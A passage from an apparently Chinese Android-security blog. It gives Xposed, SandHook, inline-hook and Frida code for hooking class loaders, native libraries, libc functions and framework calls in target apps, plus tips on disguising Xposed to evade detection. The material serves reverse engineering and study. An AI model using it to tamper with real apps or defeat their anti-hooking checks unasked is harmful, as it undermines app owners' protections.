XposedBridge.log(<span class="string">&quot;start deal with classloader:&quot;</span> + classLoader);</span><br><span class="line">    <span class="comment">//获取pathlist对象</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">pathListObj</span> <span class="operator">=</span> XposedHelpers.getObjectField(classLoader, <span class="string">&quot;pathList&quot;</span>);</span><br><span class="line">    <span class="comment">//private final Element[] dexElements;</span></span><br><span class="line">    Object[] dexElementsObj = (Object[]) XposedHelpers.getObjectField(pathListObj, <span class="string">&quot;dexElements&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (Object i : dexElementsObj) &#123;</span><br><span class="line">        <span class="comment">//private final DexFile dexFile;</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">dexFileObj</span> <span class="operator">=</span> XposedHelpers.getObjectField(i, <span class="string">&quot;dexFile&quot;</span>);</span><br><span class="line">        <span class="comment">//private Object mCookie;</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">mCookieObj</span> <span class="operator">=</span> XposedHelpers.getObjectField(dexFileObj, <span class="string">&quot;mCookie&quot;</span>);</span><br><span class="line">        <span class="comment">//private static native String[] getClassNameList(Object cookie);</span></span><br><span class="line">        <span class="comment">//    public static java.lang.Object callStaticMethod(java.lang.Class&lt;?&gt; clazz, java.lang.String methodName, java.lang.Object... args) &#123; /* compiled code */ &#125;</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">DexFileClass</span> <span class="operator">=</span> XposedHelpers.findClass(<span class="string">&quot;dalvik.system.DexFile&quot;</span>, classLoader);</span><br><span class="line">        String[] classlist = (String[]) XposedHelpers.callStaticMethod(DexFileClass, <span class="string">&quot;getClassNameList&quot;</span>, mCookieObj);</span><br><span class="line">        <span class="keyword">for</span> (String classname : classlist) &#123;</span><br><span class="line">            XposedBridge.log(dexFileObj + <span class="string">&quot;---&quot;</span> + classname);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    XposedBridge.log(<span class="string">&quot;end dealwith classloader:&quot;</span> + classLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="对于多dex的hook"><a href="#对于多dex的hook" class="headerlink" title="对于多dex的hook"></a>对于多dex的hook</h1><p>有些app里面加载了插件dex，并没有对classloader进行修正</p>
<p>可以直接hook构造函数，就可以得到dexClassLoader，然后就可以对插件dex里面的函数进行hook了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;target package name&quot;</span>))&#123;</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;target package name was finded!&quot;</span>);</span><br><span class="line"><span class="comment">// public DexClassLoader(String dexPath,String optimizedDirectory,</span></span><br><span class="line"><span class="comment">//               String librarySearchPath,ClassLoader parent)</span></span><br><span class="line">            XposedHelpers.findAndHookConstructor(<span class="string">&quot;dalvik.system.DexClassLoader&quot;</span>, loadPackageParam.classLoader, String.class, String.class, String.class, ClassLoader.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">                    <span class="comment">//得到dexclassloader</span></span><br><span class="line">                    <span class="type">DexClassLoader</span> <span class="variable">dexClassLoader</span> <span class="operator">=</span> (DexClassLoader) param.thisObject;</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;dexClassLoader:&quot;</span>+dexClassLoader);</span><br><span class="line">                    XposedHelpers.findAndHookMethod(<span class="string">&quot;target class&quot;</span>, dexClassLoader,<span class="string">&quot;method name&quot;</span>, String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                            <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                            <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">                        &#125;;</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h1 id="hook-so函数"><a href="#hook-so函数" class="headerlink" title="hook so函数"></a>hook so函数</h1><ul>
<li>加载so都是使用 <code>System.loadLibrary(&quot;native-lib&quot;);</code><strong>由于（Android 6.0以后）hook System.loadLibrary函数的收会爆出一个错误：找不到原来的so文件</strong>，所以建议不要hook该函数，<strong>而是hook他里面调用的宁一个函数</strong>：看Android源码，不要看as里面的源码</li>
<li>所以需要hook该函数，或者该函数里面调用了的某个关键的函数，然后将其替换成自己的目标so文件， <code>System.load(&quot;my.so&quot;)</code>;</li>
<li>注意这里的so文件的位置最好再&#x2F;data&#x2F;data&#x2F;packagename&#x2F;下面</li>
<li>然后修改so的执行权限</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里需要视情况而定，因为每个平台的函数可能是不同的，最好还是再AS里面看看源码</span></span><br><span class="line">XposedHelpers.findAndHookMethod(<span class="string">&quot;java.lang.Runtime&quot;</span>, loadPackageParam.classLoader, <span class="string">&quot;loadLibrary0&quot;</span>, ClassLoader.class,String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;beforeHookedMethod Runtime.loadLibrary0(&quot;</span>+param.args[<span class="number">0</span>]+<span class="string">&quot;,&quot;</span>+param.args[<span class="number">1</span>]+<span class="string">&quot;)&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">                    String soName= (String) param.args[<span class="number">1</span>];</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;afterHookedMethod Runtime.loadLibrary0(&quot;</span>+soName+<span class="string">&quot;)&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span>(soName.contains(<span class="string">&quot;native-lib&quot;</span>))&#123;</span><br><span class="line">                        <span class="comment">//注意这里的进程空间，因为一般只能访问自己的进程空间里面的东西，所以建议加载自己的so的文件放在目标app的私有data下面</span></span><br><span class="line">                        <span class="comment">//这里不能使用loadLibrary0，因为会hook到本身</span></span><br><span class="line">                        System.load(<span class="string">&quot;/data/data/targetpackagename/files/my.so&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br></pre></td></tr></table></figure>

<p>到现在就可以编写自己的so文件了，这里可以使用inline hook来进行</p>
<p>inline hook的原理：通过获取到原来函数的地址，然后编写自己的函数，将原来函数的开头部分替换成跳转到自己函数的代码，注意需要保存原来函数的指令，以及寄存器的状态，程序执行结束之后，需要将保存的原来的函数的指令写入回去。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//hook结束之后，该地址是用来保存原来函数的地址的，注意这里需要参数和原来的函数一样，</span></span><br><span class="line"><span class="type">void</span> *(*old_strstr)(<span class="type">char</span> *, <span class="type">char</span> *) = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="comment">//这是新的hook之后的函数，注意参数要和原来的一样</span></span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">new_strstr</span><span class="params">(<span class="type">char</span> *arg0, <span class="type">char</span> *arg1)</span> </span>&#123;</span><br><span class="line">    __android_log_print(<span class="number">4</span>, <span class="string">&quot;hook&quot;</span>, <span class="string">&quot;strstr is called,arg1:%s,arg2:%s&quot;</span>, arg0, arg1);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(arg1, <span class="string">&quot;hook&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//过滤正常的函数调用，</span></span><br><span class="line">        <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> &amp;a;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果是正常的函数调用的话，就需要调用原来的函数，并正确返回</span></span><br><span class="line">        <span class="type">void</span> *result = <span class="built_in">old_strstr</span>(arg0, arg1);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">starthooklibc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//找到目标so的地址</span></span><br><span class="line">    <span class="type">void</span> *libchandle = <span class="built_in">dlopen</span>(<span class="string">&quot;libc.so&quot;</span>, RTLD_NOW);</span><br><span class="line">    <span class="comment">//找到so中目标函数的地址</span></span><br><span class="line">    <span class="type">void</span> *strstr_addr = <span class="built_in">dlsym</span>(libchandle, <span class="string">&quot;methodname&quot;</span>);</span><br><span class="line">    <span class="comment">//注册函数</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">registerInlineHook</span>((<span class="type">uint32_t</span>) strstr_addr, (<span class="type">uint32_t</span>) new_strstr,(<span class="type">uint32_t</span> **) &amp;old_strstr) !=ELE7EN_OK) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//hook函数</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">inlineHook</span>((<span class="type">uint32_t</span>) strstr_addr) == ELE7EN_OK) &#123;</span><br><span class="line">        __android_log_print(<span class="number">4</span>, <span class="string">&quot;hookso&quot;</span>, <span class="string">&quot;hook libc.so-&gt;methodname success!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">void</span> _init(<span class="type">void</span>) &#123;</span><br><span class="line">    <span class="built_in">starthooklibc</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="使用sandhook"><a href="#使用sandhook" class="headerlink" title="使用sandhook:"></a>使用sandhook:</h2><p>生成目标so文件，AS中新建native项目，将sandhook中native文件夹下面的内容拷贝到自己的项目的同样的位置</p>
<img src="https://raw.githubusercontent.com/Dfault0/images/main/20220603155151.png" style="zoom: 40%;" />

<p>然后将nativehook下面的build.gradle里面的内容复制到我们的项目里面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">externalNativeBuild &#123;</span><br><span class="line">    cmake &#123;</span><br><span class="line">        arguments &#x27;-DBUILD_TESTING=OFF&#x27;</span><br><span class="line">        cppFlags &quot;-frtti -fexceptions -Wpointer-arith&quot;</span><br><span class="line">        abiFilters &#x27;armeabi-v7a&#x27;, &#x27;arm64-v8a&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此外，如果自己单独写了cpp文件，则应该将其加入到cmakelist.txt文件里面。</p>
<p><strong>因为_init函数的执行时机较早，会有一些sandhook需要进行的一些初始化操作在这里进行，我们不能在这里进行hook</strong></p>
<p>选择在<strong>JNI_OnLoad</strong>函数里面执行</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sandhook_native.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;utils/log.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;android/log.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这个是原来的函数的保存地址</span></span><br><span class="line"><span class="type">void</span> *(*old_strstr)(<span class="type">char</span> *, <span class="type">char</span> *) = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">new_strstr</span><span class="params">(<span class="type">char</span> *arg0, <span class="type">char</span> *arg1)</span> </span>&#123;</span><br><span class="line">    __android_log_print(<span class="number">4</span>, <span class="string">&quot;hooksoarm64&quot;</span>, <span class="string">&quot;strstr is called,arg1:%s,arg2:%s&quot;</span>, arg0, arg1);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(arg1, <span class="string">&quot;hookso&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> &amp;a;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">void</span> *result = <span class="built_in">old_strstr</span>(arg0, arg1);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">starthooklibc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sizeof</span>(<span class="type">void</span> *) == <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="comment">//64为</span></span><br><span class="line"><span class="comment">//        void* SandInlineHookSym(const char* so, const char* symb, void* replace)</span></span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *libcpath = <span class="string">&quot;/system/lib64/libc.so&quot;</span>;</span><br><span class="line">        old_strstr = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span> *(*)(<span class="type">char</span> *, <span class="type">char</span> *)&gt;</span><br><span class="line">                (<span class="built_in">SandInlineHookSym</span>(libcpath,<span class="string">&quot;strstr&quot;</span>,<span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span> *&gt;(new_strstr)));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//32位</span></span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *libcpath = <span class="string">&quot;/system/lib/libc.so&quot;</span>;</span><br><span class="line">        old_strstr = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span> *(*)(<span class="type">char</span> *, <span class="type">char</span> *)&gt;</span><br><span class="line">                (<span class="built_in">SandInlineHookSym</span>(libcpath,<span class="string">&quot;strstr&quot;</span>,</span><br><span class="line">                                   <span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span> *&gt;(new_strstr)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">testhook</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *content)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(content, <span class="string">&quot;hookso&quot;</span>) != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        __android_log_print(<span class="number">4</span>, <span class="string">&quot;xposedhookso&quot;</span>, <span class="string">&quot;find hookso&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        __android_log_print(<span class="number">4</span>, <span class="string">&quot;xposedhookso&quot;</span>, <span class="string">&quot;not find hookso&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> (*testhookfunctin)(<span class="type">const</span> <span class="type">char</span> *) = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">void</span> _init(<span class="type">void</span>) &#123;</span><br><span class="line"><span class="comment">//不能再这里执行，否则程序会直接闪退</span></span><br><span class="line"><span class="comment">//    starthooklibc();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">jint JNICALL <span class="title">JNI_OnLoad</span><span class="params">(JavaVM *vm, <span class="type">void</span> *reserved)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">LOGD</span>(<span class="string">&quot;go into JNI_OnLoad&quot;</span>);</span><br><span class="line">    <span class="built_in">starthooklibc</span>();</span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_6;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">JNIEXPORT jstring JNICALL</span></span><br><span class="line"><span class="function"><span class="title">Java_com_example_xposedhookbysandhook_MainActivity_stringFromJNI</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        JNIEnv* env,</span></span></span><br><span class="line"><span class="params"><span class="function">        jobject <span class="comment">/* this */</span>)</span> </span>&#123;</span><br><span class="line">    std::string hello = <span class="string">&quot;Hello from C++&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> env-&gt;<span class="built_in">NewStringUTF</span>(hello.<span class="built_in">c_str</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="so中的主动调用"><a href="#so中的主动调用" class="headerlink" title="so中的主动调用"></a>so中的主动调用</h1><p>可以通过使用sandhook的库函数来对目标so文件中的函数进行主动调用。</p>
<blockquote>
<p>其主要的思想: 获取so文件的基地址，然后再加上函数的便宜地址就可以得到函数的地址，然后可以进行调用了</p>
<p>偏移地址的获取：用idea打开so文件，然后查找目标函数（再函数窗口直接搜索，然后再.text节中就可以看到偏移地址）（注意再thumb指令集中，地址都是奇数的，所以最后得到的基地址还需要+1）</p>
<p>得到地址之后就可以直接进行调用了</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> (*testhookfunctin)(<span class="type">const</span> <span class="type">char</span> *) = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">activecalltesthook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*testhook)</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span>;</span><br><span class="line"></span><br><span class="line">    testhook testhookfunction = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="comment">//得到函数地址</span></span><br><span class="line"><span class="comment">/*    extern &quot;C&quot;</span></span><br><span class="line"><span class="comment">    EXPORT void* SandGetModuleBase(const char* so);*/</span></span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *libnativebase = <span class="built_in">SandGetModuleBase</span>(<span class="string">&quot;libnative-lib.so&quot;</span>);</span><br><span class="line">    <span class="comment">//thumb</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">sizeof</span>(<span class="type">void</span>*)==<span class="number">4</span>)&#123;</span><br><span class="line">        <span class="comment">//32位</span></span><br><span class="line">        <span class="comment">//注意地址是不能直接进行运算的，需要将其转换成数据，然后再赋值给地址</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> tmpaddr = (<span class="type">unsigned</span> <span class="type">long</span>) libnativebase + <span class="number">0x8B4C</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="type">void</span> *testhookaddr = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span> *&gt;(tmpaddr);</span><br><span class="line">        testhookfunction = <span class="built_in">reinterpret_cast</span>&lt;testhook&gt;(testhookaddr);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//64位</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> tmpaddr = (<span class="type">unsigned</span> <span class="type">long</span>) libnativebase + <span class="number">0xf67c</span>;</span><br><span class="line">        <span class="type">void</span> *testhookaddr = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span> *&gt;(tmpaddr);</span><br><span class="line">        testhookfunction = <span class="built_in">reinterpret_cast</span>&lt;testhook&gt;(testhookaddr);</span><br><span class="line">        <span class="built_in">LOGD</span>(<span class="string">&quot;libnative-lib.so base:%p,testfuncaddr:%p&quot;</span>,libnativebase,(<span class="type">void</span>*)tmpaddr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> result1 = <span class="built_in">testhookfunction</span>(<span class="string">&quot;aaaaahookso&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">LOGD</span>(<span class="string">&quot;testhookfunction(\&quot;aaaaahookso\&quot;); return:%d&quot;</span>, result1);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> result2 = <span class="built_in">testhookfunction</span>(<span class="string">&quot;aaaabbbbb&quot;</span>);</span><br><span class="line">    <span class="built_in">LOGD</span>(<span class="string">&quot;testhookfunction(\&quot;aaaabbbbb\&quot;); return:%d&quot;</span>, result2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="xposed检测"><a href="#xposed检测" class="headerlink" title="xposed检测"></a>xposed检测</h1><p>检测xposed：</p>
<ul>
<li>检测是否安装了xposed installer管理器</li>
<li>观看是否一个原本的Java函数变成了native函数</li>
<li>检测动态链接库</li>
<li>检测代码堆栈的caller</li>
<li>检测xposed环境</li>
<li>检测环境变量</li>
<li>检测root与否</li>
</ul>
<p>定制xposed:</p>
<ul>
<li>修改xposed中所有关于xposed相关的类，函数等指纹信息</li>
<li>修改su的执行名称</li>
</ul>
<h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p>inline hook: <a href="https://github.com/ele7enxxh/Android-Inline-Hook">https://github.com/ele7enxxh/Android-Inline-Hook</a></p>
<p>sandhook: <a href="https://github.com/asLody/SandHook">https://github.com/asLody/SandHook</a></p>
<p>xposedcher:<a href="https://github.com/w568w/XposedChecker">https://github.com/w568w/XposedChecker</a></p>
<p>xposed:<a href="https://github.com/rovo89/Xposed">https://github.com/rovo89/Xposed</a></p>
]]></content>
      <categories>
        <category>Android安全</category>
        <category>Xposed</category>
      </categories>
      <tags>
        <tag>Android安全</tag>
        <tag>Xposed</tag>
      </tags>
  </entry>
  <entry>
    <title>frida-基础二</title>
    <url>/2022/06/10/frida-%E5%9F%BA%E7%A1%80%E4%BA%8C/</url>
    <content><![CDATA[<h1 id="hook系统框架层的代码"><a href="#hook系统框架层的代码" class="headerlink" title="hook系统框架层的代码"></a>hook系统框架层的代码</h1><p><strong>hook intent</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Activity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;android.app.Activity&#x27;</span>)</span><br><span class="line">        <span class="title class_">Activity</span>.<span class="property">startActivity</span>.<span class="title function_">overload</span>(<span class="string">&#x27;android.content.Intent&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg0</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hooking android.app.Activity.startActuvuty(arg0) successfully,arg=&#x27;</span>,arg0)</span><br><span class="line">            <span class="comment">// console.log(Java.use(&#x27;android.util.Log&#x27;).getStackTraceString(Java.use(&#x27;java.lang.Throwable&#x27;).$new()))</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">decodeURIComponent</span>(arg0.<span class="title function_">toUri</span>(<span class="number">256</span>)))</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">startActivity</span>(arg0)</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="title class_">Activity</span>.<span class="property">startActivity</span>.<span class="title function_">overload</span>(<span class="string">&#x27;android.content.Intent&#x27;</span>,<span class="string">&#x27;android.os.Bundle&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg0,arg1</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hooking android.app.Activity.startActuvuty(arg0,arg1) successfully,arg0=&#x27;</span>+arg0+<span class="string">&#x27;,arg1=&#x27;</span>+arg1)</span><br><span class="line">            <span class="comment">// console.log(Java.use(&#x27;android.util.Log&#x27;).getStackTraceString(Java.use(&#x27;java.lang.Throwable&#x27;).$new()))</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">decodeURIComponent</span>(arg0.<span class="title function_">toUri</span>(<span class="number">256</span>)))</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">startActivity</span>(arg0,arg1)</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="title class_">Activity</span>.<span class="property">startService</span>.<span class="title function_">overload</span>(<span class="string">&#x27;android.content.Intent&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg0</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hooking android.app.Activity.startService(arg0) successfully,arg=&#x27;</span>,arg0)</span><br><span class="line">            <span class="comment">// console.log(Java.use(&#x27;android.util.Log&#x27;).getStackTraceString(Java.use(&#x27;java.lang.Throwable&#x27;).$new()))</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">decodeURIComponent</span>(arg0.<span class="title function_">toUri</span>(<span class="number">256</span>)))</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">startActivity</span>(arg0)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure>

<p><strong>hook event</strong>  可以达到快速定位的目的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> jclazz = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> jobj = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getObjClassName</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!jclazz) &#123;</span><br><span class="line">        <span class="keyword">var</span> jclazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!jobj) &#123;</span><br><span class="line">        <span class="keyword">var</span> jobj = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Object&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> jclazz.<span class="property">getName</span>.<span class="title function_">call</span>(jobj.<span class="property">getClass</span>.<span class="title function_">call</span>(obj));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">watch</span>(<span class="params">obj, mtdName</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> listener_name = <span class="title function_">getObjClassName</span>(obj);</span><br><span class="line">    <span class="keyword">var</span> target = <span class="title class_">Java</span>.<span class="title function_">use</span>(listener_name);</span><br><span class="line">    <span class="keyword">if</span> (!target || !mtdName <span class="keyword">in</span> target) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// send(&quot;[WatchEvent] hooking &quot; + mtdName + &quot;: &quot; + listener_name);</span></span><br><span class="line">    target[mtdName].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">overload</span>) &#123;</span><br><span class="line">        overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="comment">//send(&quot;[WatchEvent] &quot; + mtdName + &quot;: &quot; + getObjClassName(this));</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[WatchEvent] &quot;</span> + mtdName + <span class="string">&quot;: &quot;</span> + <span class="title function_">getObjClassName</span>(<span class="variable language_">this</span>))</span><br><span class="line">            <span class="keyword">return</span> <span 